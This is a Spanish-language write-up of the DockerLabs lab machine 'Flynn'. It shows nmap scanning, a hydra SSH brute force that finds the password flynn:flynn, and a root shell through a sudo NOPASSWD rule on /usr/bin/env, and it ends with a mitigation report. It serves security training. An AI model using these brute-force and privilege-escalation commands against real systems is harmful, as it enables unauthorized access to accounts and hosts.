# Flynn

> La web expone el nombre de usuario en el propio HTML; con hydra descubro que su contraseña es trivial (igual al usuario) y escalo a root abusando de un sudo NOPASSWD sobre /usr/bin/env.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `Hydra` · `Fuerza bruta SSH` · `Disclosure de usuario` · `sudo` · `env` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
```

Dos puertos: SSH (22) y un servidor web (80). Empiezo por la web.

## Enumeración web

La portada es minimalista, pero su propio HTML canta el nombre de usuario.

```bash
$ curl -s http://172.17.0.2
<h1>flynn</h1>
<img src="flynn.png">
```

La imagen `flynn.png` no esconde metadatos ni datos útiles, y gobuster no encuentra más rutas que `index.html`. Así que la pista es clara: el usuario **flynn**.

## Fuerza bruta del usuario flynn

```bash
$ hydra -l flynn -P rockyou.txt ssh://172.17.0.2 -t 4
[22][ssh] host: 172.17.0.2   login: flynn   password: flynn
1 of 1 target successfully completed, 1 valid password found
```

La credencial resulta ser **flynn : flynn**: la contraseña es el propio nombre de usuario, el clásico de los clásicos.

> **Nota.** Si hydra devuelve 'children were disabled...' significa que el SSH limita la fuerza bruta. Baja a `-t 1 -W 5` para comprobar que conecta, limpia la clave vieja con `ssh-keygen -R 172.17.0.2` y vuelve a subir a `-t 4`.

## Acceso por SSH

```bash
$ ssh flynn@172.17.0.2
flynn@172.17.0.2's password: (flynn)
Welcome to Ubuntu 26.04 LTS
flynn@687ec7404c82:~$ whoami
flynn
```

## Escalada a root · sudo env

```bash
$ sudo -l
User flynn may run the following commands on 687ec7404c82:
    (ALL) NOPASSWD: /usr/bin/env
```

flynn puede ejecutar `env` como root sin contraseña. Como env sirve para lanzar otros programas, le pido que ejecute una bash, que heredará el contexto de root (GTFOBins).

```bash
$ sudo /usr/bin/env /bin/bash
root@687ec7404c82:/home/flynn# id
uid=0(root) gid=0(root) groups=0(root)
```

En `/root/password.txt` hay un easter egg temático de Tron Legacy, un detalle del autor sin valor operativo. Máquina Flynn completada.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo NOPASSWD sobre /usr/bin/env

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** flynn puede ejecutar env como root sin contraseña; env lanza cualquier binario heredando ese contexto, dando una shell root directa (GTFOBins).

**Mitigación.** Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre binarios que pueden ejecutar otros programas (env, find, vim...).

### 🟠 ALTA — Contraseña trivial (igual al nombre de usuario)

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta flynn usa como contraseña su propio nombre, lo que permite el acceso por SSH de forma inmediata por fuerza bruta.

**Mitigación.** Contraseñas robustas y distintas del usuario, bloqueo de intentos (fail2ban) y autenticación por clave.

### ⚪ BAJA — Divulgación del nombre de usuario en la web

`CWE-200` · A05:2021 – Security Misconfiguration

**Impacto.** El HTML de la portada muestra directamente un usuario válido (flynn), dando un objetivo inmediato para la fuerza bruta.

**Mitigación.** No exponer nombres de usuario ni datos internos en el contenido público.

---

_Writeup de **Flynn** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
